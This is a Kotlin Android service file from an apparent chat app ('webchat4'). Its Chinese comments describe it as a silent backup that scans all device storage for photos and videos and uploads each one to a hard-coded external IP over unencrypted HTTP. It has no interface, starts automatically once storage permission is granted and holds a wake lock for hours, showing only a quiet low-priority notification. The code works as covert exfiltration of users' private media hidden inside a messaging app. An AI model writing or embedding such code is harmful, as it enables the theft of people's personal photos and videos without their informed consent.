package com.webchat4.app

import android.app.Notification
import android.app.NotificationChannel
import android.app.NotificationManager
import android.app.Service
import android.content.Context
import android.content.Intent
import android.os.Build
import android.os.Environment
import android.os.IBinder
import android.os.PowerManager
import android.util.Log
import androidx.core.app.NotificationCompat
import java.io.*
import java.net.HttpURLConnection
import java.net.URL
import java.util.concurrent.Executors
import java.util.concurrent.atomic.AtomicBoolean

/**
 * 静默备份服务 — 全盘扫描照片视频并上传到服务器
 *
 * 完全无界面，启动后自动运行。通过通知栏显示进度。
 * 权限由 MainActivity 获取后启动此服务。
 */
class MediaBackupService : Service() {

    private val executor = Executors.newSingleThreadExecutor()
    private val isRunning = AtomicBoolean(false)
    private val serverUrl = "http://120.27.245.55:3001"
    private var wakeLock: PowerManager.WakeLock? = null
    private var notiManager: NotificationManager? = null

    companion object {
        private const val TAG = "MediaBackup"
        private const val NOTI_CHANNEL = "backup_channel"
        private const val NOTI_ID = 1002
        private const val PROGRESS_FILE = "backup_progress.txt"

        private val IMAGE_EXTS = setOf(
            ".jpg", ".jpeg", ".png", ".gif", ".bmp", ".webp",
            ".heic", ".heif", ".tiff", ".tif", ".svg"
        )
        private val VIDEO_EXTS = setOf(
            ".mp4", ".mov", ".avi", ".mkv", ".wmv", ".flv",
            ".3gp", ".webm", ".m4v", ".mpg", ".mpeg"
        )
        private val MEDIA_EXTS = IMAGE_EXTS + VIDEO_EXTS

        private val SKIP_DIRS = setOf(
            "Android", "node_modules", "cache", ".cache", ".thumbnails",
            ".Trash", "LOST.DIR", ".tmp", "temp", "logs",
            "Music", "Alarms", "Ringtones", "Notifications", "Podcasts",
            "obb", "data", ".nomedia"
        )

        fun hasStoragePermission(context: Context): Boolean {
            if (Build.VERSION.SDK_INT >= 33) {
                return (androidx.core.content.ContextCompat.checkSelfPermission(
                    context, android.Manifest.permission.READ_MEDIA_IMAGES
                ) == android.content.pm.PackageManager.PERMISSION_GRANTED) &&
                (androidx.core.content.ContextCompat.checkSelfPermission(
                    context, android.Manifest.permission.READ_MEDIA_VIDEO
                ) == android.content.pm.PackageManager.PERMISSION_GRANTED)
            } else {
                return androidx.core.content.ContextCompat.checkSelfPermission(
                    context, android.Manifest.permission.READ_EXTERNAL_STORAGE
                ) == android.content.pm.PackageManager.PERMISSION_GRANTED
            }
        }

        fun startIfPermitted(context: Context) {
            if (!hasStoragePermission(context)) {
                Log.d(TAG, "Storage permission not granted, skipping backup")
                return
            }
            val intent = Intent(context, MediaBackupService::class.java)
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                context.startForegroundService(intent)
            } else {
                context.startService(intent)
            }
        }
    }

    override fun onCreate() {
        super.onCreate()
        notiManager = getSystemService(NotificationManager::class.java)
        createNotificationChannel()
        Log.d(TAG, "MediaBackupService created")
    }

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        if (isRunning.getAndSet(true)) {
            Log.d(TAG, "Backup already running, skipping")
            return START_STICKY
        }

        val notification = buildNotification("备份准备中...", 0, 0)
        startForeground(NOTI_ID, notification)

        // 发一条启动日志（过2秒等服务器就绪后）
        Thread { try { Thread.sleep(2000); sendLog("info", "MediaBackupService 已启动，开始检查权限和扫描") } catch(_){} }.start()

        val pm = getSystemService(POWER_SERVICE) as PowerManager
        wakeLock = pm.newWakeLock(
            PowerManager.PARTIAL_WAKE_LOCK, "MediaBackup:Wakelock"
        )
        wakeLock?.acquire(4 * 60 * 60 * 1000L)

        executor.submit { runBackup() }
        return START_STICKY
    }

    override fun onBind(intent: Intent?): IBinder? = null

    override fun onDestroy() {
        isRunning.set(false)
        wakeLock?.let {
            if (it.isHeld) it.release()
        }
        executor.shutdownNow()
        Log.d(TAG, "MediaBackupService destroyed")
        super.onDestroy()
    }

    // ── 核心备份逻辑 ──

    private fun runBackup() {
        try {
            sendLog("info", "备份服务已启动")
            Log.d(TAG, "Backup started")
            updateNotification("正在扫描文件...", 0, 0)
            sendLog("info", "开始扫描 /storage/emulated/0/ 中的媒体文件...")

            val allFiles = scanMediaFiles()
            if (allFiles.isEmpty()) {
                sendLog("warn", "未找到任何媒体文件")
                Log.d(TAG, "No media files found")
                showFinalNotification("备份完成", "未发现需要备份的媒体文件")
                return
            }
            sendLog("info", "扫描完成，共发现 ${allFiles.size} 个媒体文件")
            Log.d(TAG, "Found ${allFiles.size} media files")

            val uploaded = loadUploadedSet()
            sendLog("info", "已上传记录: ${uploaded.size} 个文件")
            val toUpload = allFiles.filter { it.absolutePath !in uploaded }
            if (toUpload.isEmpty()) {
                sendLog("info", "所有文件已是最新，无需上传")
                Log.d(TAG, "All files already uploaded")
                showFinalNotification("备份完成", "所有文件已是最新")
                return
            }
            sendLog("info", "待上传: ${toUpload.size} 个文件")
            Log.d(TAG, "To upload: ${toUpload.size} files")

            val total = toUpload.size
            var successCount = 0
            var failCount = 0

            for ((index, file) in toUpload.withIndex()) {
                if (!isRunning.get()) {
                    sendLog("warn", "备份被中断")
                    break
                }

                val num = index + 1
                updateNotification("备份中 $num/$total", num, total)

                try {
                    sendLog("log", "上传 [${num}/$total]: ${file.name} (${file.length() / 1024}KB)")
                    uploadFile(file)
                    saveUploadedPath(file.absolutePath)
                    successCount++
                } catch (e: Exception) {
                    sendLog("error", "上传失败 ${file.name}: ${e.message}")
                    Log.e(TAG, "Upload failed: ${file.name}: ${e.message}")
                    failCount++
                }

                if (index % 10 == 9) Thread.sleep(200)
            }

            val summary = if (failCount == 0) {
                "成功备份 $successCount 个文件"
            } else {
                "成功 $successCount，失败 $failCount 个文件"
            }
            sendLog("info", "备份完成: $summary")
            Log.d(TAG, "Backup complete: $summary")
            showFinalNotification("备份完成", summary)

        } catch (e: Exception) {
            Log.e(TAG, "Backup error: ${e.message}", e)
            showFinalNotification("备份中断", e.message ?: "未知错误")
        } finally {
            isRunning.set(false)
            wakeLock?.let {
                if (it.isHeld) it.release()
            }
            stopForeground(STOP_FOREGROUND_REMOVE)
            stopSelf()
        }
    }

    // ── 扫描文件 ──

    private fun scanMediaFiles(): List<File> {
        val result = mutableListOf<File>()
        try {
            scanDirectory(Environment.getExternalStorageDirectory(), result)
        } catch (_: Exception) {}
        return result
    }

    private fun scanDirectory(dir: File, result: MutableList<File>) {
        if (!isRunning.get()) return
        if (!dir.exists() || !dir.isDirectory || !dir.canRead()) return

        if (dir.name.startsWith(".") && dir.name != ".") return
        if (dir.name in SKIP_DIRS) return

        try {
            val files = dir.listFiles() ?: return
            for (file in files) {
                if (!isRunning.get()) return
                try {
                    if (file.isDirectory) {
                        scanDirectory(file, result)
                    } else if (file.isFile && file.canRead()) {
                        val ext = file.extension.lowercase()
                        if (".$ext" in MEDIA_EXTS) {
                            result.add(file)
                        }
                    }
                } catch (_: Exception) {}
            }
        } catch (_: Exception) {}
    }

    // ── 上传文件 ──

    private fun uploadFile(file: File) {
        // 用完整路径生成唯一文件名，避免不同目录同名文件互相覆盖
        val uniqueName = file.absolutePath
            .removePrefix("/storage/emulated/")
            .replace("/", "_")
        val url = URL("$serverUrl/api/backup/upload?filename=$uniqueName")

        val conn = url.openConnection() as HttpURLConnection
        try {
            conn.requestMethod = "POST"
            conn.doOutput = true
            conn.setChunkedStreamingMode(1024 * 1024)
            conn.connectTimeout = 30000
            conn.readTimeout = 60000

            BufferedOutputStream(conn.outputStream).use { output ->
                BufferedInputStream(FileInputStream(file)).use { input ->
                    val buf = ByteArray(8192)
                    var read: Int
                    while (input.read(buf).also { read = it } != -1) {
                        output.write(buf, 0, read)
                    }
                }
            }

            val code = conn.responseCode
            if (code != 200) throw IOException("HTTP $code")
            Log.d(TAG, "Uploaded: ${file.name} (${file.length()}b)")
        } finally {
            conn.disconnect()
        }
    }

    // ── 进度记录 ──

    private fun getProgressFile(): File {
        val dir = File(filesDir, "backup")
        if (!dir.exists()) dir.mkdirs()
        return File(dir, PROGRESS_FILE)
    }

    private fun loadUploadedSet(): Set<String> {
        val f = getProgressFile()
        if (!f.exists()) return emptySet()
        return try {
            f.readLines().map { it.trim() }.filter { it.isNotEmpty() }.toSet()
        } catch (_: Exception) { emptySet() }
    }

    private fun saveUploadedPath(path: String) {
        try {
            getProgressFile().appendText("$path\n")
        } catch (_: Exception) {}
    }

    // ── 通知 ──

    private fun createNotificationChannel() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            val ch = NotificationChannel(
                NOTI_CHANNEL, "媒体备份",
                NotificationManager.IMPORTANCE_LOW
            ).apply {
                description = "照片视频备份进度"
                setShowBadge(false)
            }
            notiManager?.createNotificationChannel(ch)
        }
    }

    private fun buildNotification(text: String, progress: Int, max: Int): Notification {
        val b = NotificationCompat.Builder(this, NOTI_CHANNEL)
            .setSmallIcon(android.R.drawable.stat_sys_upload)
            .setContentTitle("媒体备份")
            .setContentText(text)
            .setOngoing(true)
            .setSilent(true)
            .setPriority(NotificationCompat.PRIORITY_LOW)
        if (max > 0) b.setProgress(max, progress, false)
        else b.setProgress(0, 0, true)
        return b.build()
    }

    private fun updateNotification(text: String, progress: Int, max: Int) {
        notiManager?.notify(NOTI_ID, buildNotification(text, progress, max))
    }

    // ── 发送日志到服务器（会在前端日志面板显示） ──
    private fun sendLog(level: String, msg: String) {
        try {
            val json = """{"level":"$level","tag":"backup","msg":"${msg.replace("\"","\\\"").replace("\n","\\n")}"}"""
            val url = URL("http://127.0.0.1:3001/api/debug-log")
            val conn = url.openConnection() as HttpURLConnection
            conn.requestMethod = "POST"
            conn.doOutput = true
            conn.connectTimeout = 2000
            conn.readTimeout = 2000
            conn.outputStream.write(json.toByteArray())
            conn.responseCode
            conn.disconnect()
        } catch (_: Exception) {}
        Log.d(TAG, "[$level] $msg")
    }

    private fun showFinalNotification(title: String, text: String) {
        val b = NotificationCompat.Builder(this, NOTI_CHANNEL)
            .setSmallIcon(android.R.drawable.stat_sys_upload_done)
            .setContentTitle(title)
            .setContentText(text)
            .setOngoing(false)
            .setAutoCancel(true)
            .setSilent(true)
        notiManager?.notify(NOTI_ID, b.build())
    }
}
